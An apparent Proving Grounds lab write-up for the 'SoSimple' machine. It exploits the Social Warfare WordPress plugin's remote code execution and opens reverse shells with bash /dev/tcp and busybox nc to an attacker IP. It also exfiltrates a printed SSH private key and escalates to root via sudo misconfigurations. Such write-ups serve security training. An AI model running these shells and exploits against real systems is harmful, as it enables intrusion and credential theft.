# SoSimple

## Initial access

Run `autorecon` to enumerate open ports and services:

```
sudo autorecon 192.168.249.78
```

Open ports discovered:

- **22** — SSH (OpenSSH 8.2p1 Ubuntu 4ubuntu0.1, Ubuntu Linux; protocol 2.0)
- **80** — HTTP (Apache httpd 2.4.41, Ubuntu)
  - Additional webpages:
    - `http://192.168.249.78/mybackup.txt`
    - `http://192.168.249.78/wordpress/`

Browse to `http://192.168.249.78/mybackup.txt` to find a Base32-encoded string:

```
JEQGQYLWMUQHI3ZANNSWK4BAORUGS4ZAOBQXG43XN5ZGIIDTN5WWK53IMVZGKIDTMFTGK3DZEBRGKY3BOVZWKICJEBRWC3RHOQQHEZLNMVWWEZLSEBUXIORAN5YGK3TTMVZWC3LF
```

Decode the string with Base32 to reveal a plaintext message and password:

```
I have to keep this password somewhere safely because I can't remember it: opensesame
```

The decoded password `opensesame` is a potential credential.

Run `wpscan` against the WordPress site at `http://192.168.249.78/wordpress/` to enumerate users and plugins:

```
[+] WordPress version 5.4.2 identified (Insecure, released on 2020-06-10).
 | Found By: Rss Generator (Passive Detection)
 |  - http://192.168.249.78/wordpress/index.php/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>
 | Confirmed By: Rss Generator (Passive Detection)
 |  - http://192.168.249.78/wordpress/index.php/comments/feed/, <generator>https://wordpress.org/?v=5.4.2</generator>
...
[+] Enumerating Most Popular Plugins (via Aggressive Methods)

[+] social-warfare
 | Location: http://192.168.249.78/wordpress/wp-content/plugins/social-warfare/
 | Last Updated: 2025-03-18 9:37am GMT (1 year ago, per WordPress.org)
 | Active Installs: 10,000 (per WordPress.org)
 | Readme: http://192.168.249.78/wordpress/wp-content/plugins/social-warfare/readme.txt
 | [!] The version is out of date, the latest version is 4.5.6
 | [!] Directory listing is enabled
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://192.168.249.78/wordpress/wp-content/plugins/social-warfare/, status: 200
 |
 | Version: 3.5.0 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://192.168.249.78/wordpress/wp-content/plugins/social-warfare/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://192.168.249.78/wordpress/wp-content/plugins/social-warfare/readme.txt
...
[+] Enumerating Users (via Passive and Aggressive Methods)

[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)

[+] max
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Methods)
```

The Social Warfare plugin version 3.5.0 is out of date and vulnerable to remote code execution. Search for the exploit in `searchsploit`:

```
searchsploit social warfare
----------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                     |  Path
----------------------------------------------------------------------------------- ---------------------------------
Social Warfare WordPress Plugin 3.5.2 - Remote Code Execution (RCE)                | multiple/webapps/52346.py
WordPress Plugin Social Warfare < 3.5.3 - Remote Code Execution                    | php/webapps/46794.py
----------------------------------------------------------------------------------- ---------------------------------
```

Download the exploit script (EDB-52346), modify the configuration variables, and run it:

```
searchsploit -m 52346

nano 52346.py
# --- Config ---
TARGET_URL = "http://192.168.249.78/wordpress"
ATTACKER_IP = "192.168.45.189"
HTTP_PORT = 8000
LISTEN_PORT = 4443
PAYLOAD_FILE = "payload.txt"

python3 52346.py
[+] Payload written to payload.txt
[+] HTTP server running at port 8000
[+] Listening on port 4443 for reverse shell...
listening on [any] 4443 ...
[+] Sending exploit: http://192.168.249.78/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://192.168.45.189:8000/payload.txt
192.168.249.78 - - [04/Nov/2026 07:40:45] "GET /payload.txt?swp_debug=get_user_options HTTP/1.0" 200 -
connect to [192.168.45.189] from (UNKNOWN) [192.168.249.78] 57828
bash: cannot set terminal process group (799): Inappropriate ioctl for device
bash: no job control in this shell
<osimple1-245-199:/var/www/html/wordpress/wp-admin$ whoami
whoami
www-data
```

The exploit triggers a reverse shell as `www-data` via the Social Warfare RCE vulnerability (CVE-2019-9978 / CVE-2021-4434). The plugin's `swp_debug=load_options` parameter accepts a remote URL, which the target fetches and executes — in this case, a payload file containing a reverse shell command.

Stabilize the shell by spawning a second reverse shell with a proper TTY, caught with `penelope`:

```
<osimple1-245-199:/var/www/html/wordpress/wp-admin$ which bash
which bash
/usr/bin/bash
<osimple1-245-199:/var/www/html/wordpress/wp-admin$ bash -i >& /dev/tcp/192.168.45.189/4444 0>&1
<admin$ bash -i >& /dev/tcp/192.168.45.189/4444 0>&1

# penelope
www-data@lab-pg-20-ubuntu20-sosimple1-245-199:/var/www/html/wordpress/wp-admin$ whoami───────────────────────────────
www-data
```

Retrieve the `local.txt` flag:

```
www-data@lab-pg-20-ubuntu20-sosimple1-245-199:/var/www/html/wordpress/wp-admin$ find / -name local.txt 2>/dev/null
/home/max/local.txt
www-data@lab-pg-20-ubuntu20-sosimple1-245-199:/var/www/html/wordpress/wp-admin$ cat /home/max/local.txt
b44f4c6ab0a66a94953b955761324345
```

## Privilege escalation

Upload `linpeas.sh` to the target for enumeration. On the attacking machine, start a Python HTTP server:

```
python3 -m http.server 9001
```

On the target, download the script:

```
www-data@lab-pg-20-ubuntu20-sosimple1-245-199:/var/www/html/wordpress/wp-admin$ cd /tmp
www-data@lab-pg-20-ubuntu20-sosimple1-245-199:/tmp$ which wget
/usr/bin/wget

www-data@lab-pg-20-ubuntu20-sosimple1-245-199:/tmp$ wget http://192.168.45.189:9001/linux/enum/linpeas.sh
```

Run `linpeas.sh` to enumerate privilege escalation vectors:

```
www-data@lab-pg-20-ubuntu20-sosimple1-245-199:/tmp$ chmod +x linpeas.sh
www-data@lab-pg-20-ubuntu20-sosimple1-245-199:/tmp$ ./linpeas.sh
```

Important findings from the enumeration output:

```
╔══════════╣ Analyzing Wordpress Files (limit 70)
-rwxr-xr-x 1 www-data www-data 3331 Jul 14  2020 /var/www/html/wordpress/wp-config.php
define( 'DB_NAME', 'wordpress' );
define( 'DB_USER', 'wp_user' );
define( 'DB_PASSWORD', 'password' );
define( 'DB_HOST', 'localhost' );
define( 'WP_SITEURL', 'http://' .$_SERVER['HTTP_HOST'].'/wordpress');
define( 'WP_HOME', 'http://' .$_SERVER['HTTP_HOST'].'/wordpress');
...
-rwxr-xr-x 1 root root 2602 Jul 14  2020 /home/max/.ssh/id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

The SSH private key for user `max` at `/home/max/.ssh/id_rsa` is readable by `www-data` (owned by `root:root` with permissions `rwxr-xr-x`). Export the private key to the attacking machine and authenticate via SSH:

```
nano max_id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----

chmod 600 max_id_rsa
ssh max@192.168.249.78 -i max_id_rsa

max@lab-pg-20-ubuntu20-sosimple1-245-199:~$ whoami
max
```

Check sudo privileges for the `max` user:

```
sudo -l
...
User max may run the following commands on lab-pg-20-ubuntu20-sosimple1-245-199:
    (steven) NOPASSWD: /usr/sbin/service
```

The `max` user can run `/usr/sbin/service` as user `steven` without a password. Use GTFOBins' `service` sudo escape to gain a shell as `steven`:

```
max@lab-pg-20-ubuntu20-sosimple1-245-199:~$ sudo -u steven /usr/sbin/service ../../bin/sh

$ whoami
steven
```

Stabilize the shell by spawning a second reverse shell with `busybox nc`, caught with `penelope`:

```
$ which busybox
/usr/bin/busybox
$ busybox nc 192.168.45.189 4444 -e bash

# penelope
steven@lab-pg-20-ubuntu20-sosimple1-245-199:/$ whoami
steven
```

Check sudo privileges for the `steven` user:

```
steven@lab-pg-20-ubuntu20-sosimple1-245-199:/$ sudo -l
...
User steven may run the following commands on lab-pg-20-ubuntu20-sosimple1-245-199:
    (root) NOPASSWD: /opt/tools/server-health.sh
```

The `steven` user can run `/opt/tools/server-health.sh` as root. However, the script does not exist on the system:

```
steven@lab-pg-20-ubuntu20-sosimple1-245-199:/$ cat /opt/tools/server-health.sh
cat: /opt/tools/server-health.sh: No such file or directory
```

The `/opt` directory is owned by `steven`, allowing creation of the missing script path:

```
steven@lab-pg-20-ubuntu20-sosimple1-245-199:/$ ls -al /opt
total 8
drwxr-xr-x  2 steven steven 4096 Sep  3  2020 .
drwxr-xr-x 20 root   root   4096 Nov  4 12:20 ..
```

Create the `/opt/tools/` directory and a malicious `server-health.sh` script that spawns a root shell:

```
steven@lab-pg-20-ubuntu20-sosimple1-245-199:/$ mkdir /opt/tools

steven@lab-pg-20-ubuntu20-sosimple1-245-199:/$ which bash
/usr/bin/bash
steven@lab-pg-20-ubuntu20-sosimple1-245-199:/$ which python3
/usr/bin/python3

steven@lab-pg-20-ubuntu20-sosimple1-245-199:/$ nano /opt/tools/server-health.sh
#!/usr/bin/bash
python3 -c 'import os; os.execl("/bin/sh", "sh")'

steven@lab-pg-20-ubuntu20-sosimple1-245-199:/$ chmod +x /opt/tools/server-health.sh
```

Execute the crafted script as root to gain a privileged shell:

```
steven@lab-pg-20-ubuntu20-sosimple1-245-199:/$ sudo -u root /opt/tools/server-health.sh

# whoami
root
```

Retrieve the `proof.txt` flag:

```
# cd /root
# cat proof.txt
a46dbb92397047012f0023ac0217480b
```

### Alternative Privilege Escalation — LXD group membership

The `max` user is a member of the `lxd` group, which allows container escape to gain root privileges. An LXD container can be configured to mount the host's root filesystem, providing a root shell on the host. A bash exploit script automates this process for Ubuntu 18.04:

```
searchsploit -m 46978
```

Credit: [Pine Damian — SoSimple Write-Up Proving Grounds](https://medium.com/@marshal_demi/sosimple-write-up-proving-grounds-1577a44605f1)
